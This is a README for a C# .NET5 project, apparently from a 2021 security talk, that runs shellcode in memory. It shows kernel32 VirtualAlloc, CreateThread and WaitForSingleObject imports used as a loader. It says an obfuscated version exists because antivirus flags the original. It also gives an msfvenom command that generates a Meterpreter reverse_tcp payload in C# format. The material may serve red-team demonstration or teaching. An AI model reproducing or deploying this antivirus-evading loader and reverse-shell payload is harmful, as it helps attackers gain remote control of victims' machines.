# ozsec2021-shellcode
C# .NET5 console project for executing shell code 

# Description: 
Two code files are included: *Original.cs* and *Program.cs*. 
*Original.cs* - Pre-Obfuscation 
*Program.cs* - Post-Obfuscation

Currently *Original.cs* will need to be removed from the VS Project in order to compile- AV catches bad.

## Running shellcode in c#
Generic Process (ie, allocate memory, copy shellcode in, execute): 
Using the following `kernel32` DLL calls:
```csharp
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
```

To update the testable shellcode, fire off a quick:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
```
